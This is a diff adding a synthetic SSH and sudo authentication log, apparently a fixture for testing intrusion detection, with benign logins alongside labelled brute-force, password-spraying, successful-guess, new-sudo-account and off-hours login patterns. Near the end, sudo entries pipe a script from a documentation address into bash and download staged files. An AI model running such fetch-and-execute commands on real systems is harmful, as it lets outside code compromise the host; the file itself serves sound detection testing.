@@ -1,0 +1,50 @@
+# SYNTHETIC LOG. Not from a real system.
+# Addresses are RFC 5737 documentation ranges: 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24.
+# Account names are roles (deploy, ops, svcbackup), not people.
+
+# Benign: daytime key-based login, a normal sudo, one mistyped password, a cron session.
+2026-10-27T09:00:00Z web01 CRON[900]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+2026-10-27T09:00:01Z web01 sshd[1401]: Accepted publickey for deploy from 192.0.2.10 port 52022 ssh2
+2026-10-27T09:05:00Z web01 sudo[2210]: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+2026-10-27T09:10:00Z web01 sshd[1408]: Failed password for deploy from 192.0.2.10 port 52030 ssh2
+2026-10-27T09:10:20Z web01 sshd[1409]: Accepted password for deploy from 192.0.2.10 port 52031 ssh2
+2026-10-27T11:00:00Z web01 sshd[1500]: Accepted password for ops from 192.0.2.25 port 51100 ssh2
+2026-10-27T11:02:00Z web01 sudo[1502]: pam_unix(sudo:session): session opened for user root(uid=0) by ops(uid=1000)
+
+# Password guessing against root from one documentation address.
+2026-10-27T14:00:00Z web01 sshd[1601]: Failed password for root from 203.0.113.10 port 41001 ssh2
+2026-10-27T14:00:10Z web01 sshd[1602]: Failed password for root from 203.0.113.10 port 41002 ssh2
+2026-10-27T14:00:20Z web01 sshd[1603]: Failed password for root from 203.0.113.10 port 41003 ssh2
+2026-10-27T14:00:30Z web01 sshd[1604]: Failed password for root from 203.0.113.10 port 41004 ssh2
+2026-10-27T14:00:40Z web01 sshd[1605]: Failed password for root from 203.0.113.10 port 41005 ssh2
+2026-10-27T14:00:50Z web01 sshd[1606]: Failed password for root from 203.0.113.10 port 41006 ssh2
+
+# One guess against several accounts: password spraying.
+2026-10-27T15:00:00Z web01 sshd[1701]: Failed password for invalid user alpha from 203.0.113.20 port 42001 ssh2
+2026-10-27T15:00:10Z web01 sshd[1702]: Failed password for invalid user bravo from 203.0.113.20 port 42002 ssh2
+2026-10-27T15:00:20Z web01 sshd[1703]: Failed password for invalid user charlie from 203.0.113.20 port 42003 ssh2
+2026-10-27T15:00:30Z web01 sshd[1704]: Failed password for invalid user delta from 203.0.113.20 port 42004 ssh2
+2026-10-27T15:00:40Z web01 sshd[1705]: Failed password for invalid user echo from 203.0.113.20 port 42005 ssh2
+2026-10-27T15:00:50Z web01 sshd[1706]: Failed password for invalid user foxtrot from 203.0.113.20 port 42006 ssh2
+
+# Guessing that then succeeds. The plain brute-force alert for this source is suppressed.
+2026-10-27T16:40:00Z web01 sshd[1801]: Failed password for admin from 203.0.113.30 port 43001 ssh2
+2026-10-27T16:40:10Z web01 sshd[1802]: Failed password for admin from 203.0.113.30 port 43002 ssh2
+2026-10-27T16:40:20Z web01 sshd[1803]: Failed password for admin from 203.0.113.30 port 43003 ssh2
+2026-10-27T16:40:30Z web01 sshd[1804]: Failed password for admin from 203.0.113.30 port 43004 ssh2
+2026-10-27T16:40:40Z web01 sshd[1805]: Failed password for admin from 203.0.113.30 port 43005 ssh2
+2026-10-27T16:40:50Z web01 sshd[1806]: Failed password for admin from 203.0.113.30 port 43006 ssh2
+2026-10-27T16:41:10Z web01 sshd[1807]: Accepted password for admin from 203.0.113.30 port 43007 ssh2
+
+# New local account, then sudo. The shadow-group line is the duplicate Linux writes; it is ignored.
+2026-10-27T18:00:00Z web01 useradd[3101]: new user: name=svcbackup, UID=1007, GID=1007, home=/home/svcbackup, shell=/bin/bash
+2026-10-27T18:00:05Z web01 usermod[3102]: add 'svcbackup' to group 'sudo'
+2026-10-27T18:00:06Z web01 usermod[3102]: add 'svcbackup' to shadow group 'sudo'
+
+# Suspicious commands run with sudo. URLs use the documentation range only.
+2026-10-27T18:05:00Z web01 sudo[3200]: www-data : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c curl -fsSL http://203.0.113.80/setup.sh | bash
+2026-10-27T18:06:00Z web01 sudo[3201]: www-data : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget -O /tmp/setup.sh http://203.0.113.80/setup.sh
+2026-10-27T18:07:00Z web01 sudo[3202]: www-data : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl -o /tmp/stage.bin http://203.0.113.80/stage.bin
+
+# 23:40 UTC is 01:40 SAST. One successful logon, no earlier failures from this address.
+2026-10-27T23:40:00Z web01 sshd[1901]: Accepted password for ops from 198.51.100.40 port 44010 ssh2
